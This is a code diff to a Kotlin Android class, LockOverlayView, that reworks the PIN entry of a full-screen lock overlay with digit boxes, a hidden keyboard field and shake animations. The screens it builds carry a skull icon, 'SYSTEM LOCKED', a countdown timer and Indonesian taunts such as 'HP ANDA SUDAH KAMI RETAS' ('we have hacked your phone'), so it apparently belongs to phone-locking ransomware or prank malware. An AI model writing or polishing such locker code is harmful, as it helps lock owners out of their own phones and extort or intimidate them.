@@ -10,12 +10,19 @@ import android.graphics.drawable.GradientDrawable
 import android.os.Build
 import android.os.Handler
 import android.os.Looper
+import android.text.Editable
 import android.text.InputType
+import android.text.TextWatcher
 import android.util.TypedValue
 import android.view.Gravity
 import android.view.View
 import android.view.WindowManager
-import android.widget.*
+import android.view.inputmethod.InputMethodManager
+import android.widget.Button
+import android.widget.EditText
+import android.widget.FrameLayout
+import android.widget.LinearLayout
+import android.widget.TextView
 
 object LockOverlayView {
 
@@ -52,9 +59,6 @@ object LockOverlayView {
             ctx.resources.displayMetrics
         ).toInt()
 
-    // ============================================================
-    // CARD BACKGROUND
-    // ============================================================
     private fun cardBg(): GradientDrawable {
         return GradientDrawable().apply {
             shape = GradientDrawable.RECTANGLE
@@ -79,15 +83,30 @@ object LockOverlayView {
         }
     }
 
+    private fun pinBox(ctx: Context): TextView {
+        return TextView(ctx).apply {
+            text = "_"
+            setTextColor(Color.parseColor("#00FF66"))
+            setTextSize(TypedValue.COMPLEX_UNIT_SP, 28f)
+            gravity = Gravity.CENTER
+            background = GradientDrawable().apply {
+                shape = GradientDrawable.RECTANGLE
+                cornerRadius = 12f
+                setColor(Color.parseColor("#CC141414"))
+                setStroke(2, Color.parseColor("#00FF66"))
+            }
+            setPadding(0, dp(ctx, 10), 0, 0)
+        }
+    }
+
     // ============================================================
-    // LOCK PIN
+    // LOCK PIN (pakai keyboard HP)
     // ============================================================
     fun buildPin(ctx: Context, correctPin: String, onUnlock: (View) -> Unit): View {
         val root = FrameLayout(ctx).apply {
             setBackgroundColor(Color.parseColor("#0A0A0A"))
         }
 
-        // Glow merah
         val glow = View(ctx).apply {
             setBackgroundColor(Color.parseColor("#8A0000"))
             alpha = 0.2f
@@ -100,27 +119,25 @@ object LockOverlayView {
         val card = LinearLayout(ctx).apply {
             orientation = LinearLayout.VERTICAL
             gravity = Gravity.CENTER
-            setPadding(dp(ctx, 32), dp(ctx, 40), dp(ctx, 32), dp(ctx, 40))
+            setPadding(dp(ctx, 28), dp(ctx, 36), dp(ctx, 28), dp(ctx, 36))
             background = cardBg()
         }
 
-        // Icon tengkorak
         val icon = TextView(ctx).apply {
             text = "\u2620"
             setTextColor(Color.parseColor("#E60000"))
-            setTextSize(TypedValue.COMPLEX_UNIT_SP, 80f)
+            setTextSize(TypedValue.COMPLEX_UNIT_SP, 72f)
             gravity = Gravity.CENTER
         }
 
-        // EXOID logo
         val logo = TextView(ctx).apply {
             text = "EXOID ENGINE"
             setTextColor(Color.parseColor("#F5D76E"))
-            setTextSize(TypedValue.COMPLEX_UNIT_SP, 24f)
+            setTextSize(TypedValue.COMPLEX_UNIT_SP, 22f)
             setTypeface(null, Typeface.BOLD)
             gravity = Gravity.CENTER
             letterSpacing = 0.25f
-            setPadding(0, dp(ctx, 12), 0, dp(ctx, 4))
+            setPadding(0, dp(ctx, 10), 0, dp(ctx, 4))
         }
 
         val logoSub = TextView(ctx).apply {
@@ -130,17 +147,16 @@ object LockOverlayView {
             setTypeface(null, Typeface.BOLD)
             gravity = Gravity.CENTER
             letterSpacing = 0.4f
-            setPadding(0, 0, 0, dp(ctx, 28))
+            setPadding(0, 0, 0, dp(ctx, 20))
         }
 
-        // Garis emas
         val divider = View(ctx).apply {
             setBackgroundColor(Color.parseColor("#D4AF37"))
         }
         val dividerParams = LinearLayout.LayoutParams(
             LinearLayout.LayoutParams.MATCH_PARENT,
             dp(ctx, 2)
-        ).apply { setMargins(0, 0, 0, dp(ctx, 28)) }
+        ).apply { setMargins(0, 0, 0, dp(ctx, 20)) }
         card.addView(divider, dividerParams)
 
         val title = TextView(ctx).apply {
@@ -153,38 +169,38 @@ object LockOverlayView {
         }
 
         val subtitle = TextView(ctx).apply {
-            text = "Masukkan PIN untuk membuka"
+            text = "Masukkan 4 angka PIN"
             setTextColor(Color.parseColor("#9A9A9A"))
             setTextSize(TypedValue.COMPLEX_UNIT_SP, 12f)
             gravity = Gravity.CENTER
-            setPadding(0, dp(ctx, 6), 0, dp(ctx, 24))
+            setPadding(0, dp(ctx, 6), 0, dp(ctx, 18))
         }
 
-        val pinInput = EditText(ctx).apply {
-            hint = "• • • •"
-            setHintTextColor(Color.parseColor("#3A0000"))
-            setTextColor(Color.parseColor("#00FF66"))
-            setTextSize(TypedValue.COMPLEX_UNIT_SP, 32f)
+        val pinDisplay = LinearLayout(ctx).apply {
+            orientation = LinearLayout.HORIZONTAL
             gravity = Gravity.CENTER
-            inputType = InputType.TYPE_CLASS_NUMBER
-            maxEms = 8
-            letterSpacing = 0.5f
-            background = GradientDrawable().apply {
-                shape = GradientDrawable.RECTANGLE
-                cornerRadius = 20f
-                setColor(Color.parseColor("#CC141414"))
-                setStroke(2, Color.parseColor("#00FF66"))
-            }
-            setPadding(dp(ctx, 24), dp(ctx, 16), dp(ctx, 24), dp(ctx, 16))
         }
+
+        val pinBoxes = mutableListOf<TextView>()
+        for (i in 0 until 4) {
+            val box = pinBox(ctx)
+            box.width = dp(ctx, 48)
+            box.height = dp(ctx, 58)
+            val lp = LinearLayout.LayoutParams(dp(ctx, 48), dp(ctx, 58))
+            lp.setMargins(dp(ctx, 5), 0, dp(ctx, 5), 0)
+            pinDisplay.addView(box, lp)
+            pinBoxes.add(box)
+        }
+        card.addView(pinDisplay)
 
         val status = TextView(ctx).apply {
             text = ""
             setTextColor(Color.parseColor("#E60000"))
             setTextSize(TypedValue.COMPLEX_UNIT_SP, 12f)
             gravity = Gravity.CENTER
-            setPadding(0, dp(ctx, 12), 0, dp(ctx, 12))
+            setPadding(0, dp(ctx, 14), 0, dp(ctx, 10))
         }
+        card.addView(status)
 
         val btn = Button(ctx).apply {
             text = "BUKA"
@@ -194,21 +210,7 @@ object LockOverlayView {
             letterSpacing = 0.3f
             background = btnBg("#B30000")
         }
-
-        btn.setOnClickListener {
-            if (pinInput.text.toString().trim() == correctPin) {
-                onUnlock(root)
-            } else {
-                status.text = "PIN SALAH - COBA LAGI"
-                ObjectAnimator.ofFloat(
-                    pinInput, "translationX",
-                    0f, 30f, -30f, 30f, -30f, 0f
-                ).apply {
-                    duration = 420
-                    start()
-                }
-            }
-        }
+        card.addView(btn)
 
         val floating = TextView(ctx).apply {
             text = "SYSTEM LOCKED"
@@ -217,23 +219,20 @@ object LockOverlayView {
             alpha = 0.4f
             letterSpacing = 0.3f
             gravity = Gravity.CENTER
-            setPadding(0, dp(ctx, 20), 0, 0)
+            setPadding(0, dp(ctx, 14), 0, 0)
         }
         ObjectAnimator.ofFloat(floating, "alpha", 0.15f, 0.7f, 0.15f).apply {
             duration = 1800
             repeatCount = ValueAnimator.INFINITE
             start()
         }
-
-        card.addView(icon)
-        card.addView(logo)
-        card.addView(logoSub)
-        card.addView(title)
-        card.addView(subtitle)
-        card.addView(pinInput)
-        card.addView(btn)
-        card.addView(status)
         card.addView(floating)
+
+        card.addView(icon, 0)
+        card.addView(logo, 1)
+        card.addView(logoSub, 2)
+        card.addView(title, 4)
+        card.addView(subtitle, 5)
 
         val cardParams = FrameLayout.LayoutParams(
             FrameLayout.LayoutParams.MATCH_PARENT,
@@ -243,6 +242,76 @@ object LockOverlayView {
             gravity = Gravity.CENTER
         }
         root.addView(card, cardParams)
+
+        // Invisible EditText untuk trigger keyboard HP
+        val hiddenInput = EditText(ctx).apply {
+            alpha = 0f
+            width = 1
+            height = 1
+            inputType = InputType.TYPE_CLASS_NUMBER
+            maxEms = 4
+            isFocusable = true
+            isFocusableInTouchMode = true
+        }
+        val hiddenParams = FrameLayout.LayoutParams(1, 1)
+        root.addView(hiddenInput, hiddenParams)
+
+        hiddenInput.postDelayed({
+            try {
+                hiddenInput.requestFocus()
+                val imm = ctx.getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
+                imm.showSoftInput(hiddenInput, InputMethodManager.SHOW_IMPLICIT)
+            } catch (_: Exception) {}
+        }, 400)
+
+        hiddenInput.addTextChangedListener(object : TextWatcher {
+            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
+            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
+
+            override fun afterTextChanged(s: Editable?) {
+                val txt = s?.toString() ?: ""
+                if (txt.length > 4) {
+                    hiddenInput.setText(txt.substring(0, 4))
+                    hiddenInput.setSelection(4)
+                    return
+                }
+
+                for (i in 0 until 4) {
+                    pinBoxes[i].text = if (i < txt.length) "\u25CF" else "_"
+                }
+
+                if (txt.length == 4) {
+                    if (txt == correctPin) {
+                        try {
+                            val imm = ctx.getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
+                            imm.hideSoftInputFromWindow(hiddenInput.windowToken, 0)
+                        } catch (_: Exception) {}
+                        onUnlock(root)
+                    } else {
+                        status.text = "PIN SALAH"
+                        for (b in pinBoxes) {
+                            ObjectAnimator.ofFloat(b, "translationX", 0f, 18f, -18f, 18f, -18f, 0f).apply {
+                                duration = 400
+                                start()
+                            }
+                        }
+                        hiddenInput.postDelayed({
+                            hiddenInput.setText("")
+                            for (b in pinBoxes) b.text = "_"
+                        }, 500)
+                    }
+                }
+            }
+        })
+
+        btn.setOnClickListener {
+            val txt = hiddenInput.text.toString()
+            if (txt == correctPin) {
+                onUnlock(root)
+            } else {
+                status.text = "PIN SALAH"
+            }
+        }
 
         ObjectAnimator.ofFloat(glow, "alpha", 0.15f, 0.35f, 0.15f).apply {
             duration = 2000
@@ -273,7 +342,7 @@ object LockOverlayView {
         val container = LinearLayout(ctx).apply {
             orientation = LinearLayout.VERTICAL
             gravity = Gravity.CENTER
-            setPadding(dp(ctx, 32), dp(ctx, 40), dp(ctx, 32), dp(ctx, 40))
+            setPadding(dp(ctx, 28), dp(ctx, 36), dp(ctx, 28), dp(ctx, 36))
             background = cardBg()
         }
 
@@ -297,7 +366,7 @@ object LockOverlayView {
         val title = TextView(ctx).apply {
             text = "HAHAHA HP LU TERKUNCI HARD!!!!"
             setTextColor(Color.parseColor("#E60000"))
-            setTextSize(TypedValue.COMPLEX_UNIT_SP, 20f)
+            setTextSize(TypedValue.COMPLEX_UNIT_SP, 18f)
             setTypeface(null, Typeface.BOLD)
             gravity = Gravity.CENTER
             setPadding(0, dp(ctx, 24), 0, dp(ctx, 8))
@@ -310,7 +379,7 @@ object LockOverlayView {
             setTypeface(null, Typeface.BOLD)
             gravity = Gravity.CENTER
             letterSpacing = 0.2f
-            setPadding(0, dp(ctx, 8), 0, dp(ctx, 24))
+            setPadding(0, dp(ctx, 8), 0, dp(ctx, 20))
         }
 
         val msg = TextView(ctx).apply {
@@ -318,7 +387,7 @@ object LockOverlayView {
             setTextColor(Color.parseColor("#9A9A9A"))
             setTextSize(TypedValue.COMPLEX_UNIT_SP, 12f)
             gravity = Gravity.CENTER
-            setPadding(0, 0, 0, dp(ctx, 32))
+            setPadding(0, 0, 0, dp(ctx, 24))
         }
 
         val warning = TextView(ctx).apply {
@@ -369,7 +438,7 @@ object LockOverlayView {
         val container = LinearLayout(ctx).apply {
             orientation = LinearLayout.VERTICAL
             gravity = Gravity.CENTER
-            setPadding(dp(ctx, 32), dp(ctx, 40), dp(ctx, 32), dp(ctx, 40))
+            setPadding(dp(ctx, 28), dp(ctx, 36), dp(ctx, 28), dp(ctx, 36))
             background = cardBg()
         }
 
@@ -388,10 +457,10 @@ object LockOverlayView {
         val title = TextView(ctx).apply {
             text = "HP ANDA SUDAH KAMI RETAS"
             setTextColor(Color.parseColor("#E60000"))
-            setTextSize(TypedValue.COMPLEX_UNIT_SP, 18f)
+            setTextSize(TypedValue.COMPLEX_UNIT_SP, 17f)
             setTypeface(null, Typeface.BOLD)
             gravity = Gravity.CENTER
-            setPadding(0, dp(ctx, 24), 0, dp(ctx, 8))
+            setPadding(0, dp(ctx, 20), 0, dp(ctx, 8))
         }
 
         val logo = TextView(ctx).apply {
@@ -401,7 +470,7 @@ object LockOverlayView {
             setTypeface(null, Typeface.BOLD)
             gravity = Gravity.CENTER
             letterSpacing = 0.2f
-            setPadding(0, dp(ctx, 8), 0, dp(ctx, 20))
+            setPadding(0, dp(ctx, 8), 0, dp(ctx, 16))
         }
 
         val message = TextView(ctx).apply {
@@ -409,12 +478,12 @@ object LockOverlayView {
             setTextColor(Color.parseColor("#D4AF37"))
             setTextSize(TypedValue.COMPLEX_UNIT_SP, 12f)
             gravity = Gravity.CENTER
-            setPadding(0, 0, 0, dp(ctx, 32))
+            setPadding(0, 0, 0, dp(ctx, 24))
         }
 
         val timerText = TextView(ctx).apply {
             setTextColor(Color.parseColor("#00FF66"))
-            setTextSize(TypedValue.COMPLEX_UNIT_SP, 48f)
+            setTextSize(TypedValue.COMPLEX_UNIT_SP, 46f)
             setTypeface(null, Typeface.BOLD)
             gravity = Gravity.CENTER
             letterSpacing = 0.15f
@@ -481,7 +550,7 @@ object LockOverlayView {
         val container = LinearLayout(ctx).apply {
             orientation = LinearLayout.VERTICAL
             gravity = Gravity.CENTER
-            setPadding(dp(ctx, 32), dp(ctx, 40), dp(ctx, 32), dp(ctx, 40))
+            setPadding(dp(ctx, 28), dp(ctx, 36), dp(ctx, 28), dp(ctx, 36))
             background = cardBg()
         }
 
